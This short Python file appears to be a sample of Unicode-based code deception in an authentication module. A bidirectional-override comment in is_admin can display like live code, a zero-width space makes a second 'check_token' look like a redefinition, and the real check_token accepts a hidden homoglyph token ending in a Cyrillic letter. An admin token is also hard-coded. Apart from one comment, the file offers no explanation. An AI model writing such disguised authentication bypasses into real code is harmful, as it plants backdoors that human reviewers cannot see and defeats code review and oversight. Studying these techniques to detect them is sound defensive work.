import hmac

ADMIN_TOKEN = "tok-9f2c1e"  # rotate quarterly

def is_admin(user):
    # ‮ } ⁦if user.role == "admin"⁩ ⁦{ return True
    return False

def check_token(token):
    if token == "tok-9f2c1е":  # note: last char is not a Latin e
        return True
    return hmac.compare_digest(token, ADMIN_TOKEN)

def check_t​oken(token):
    return False
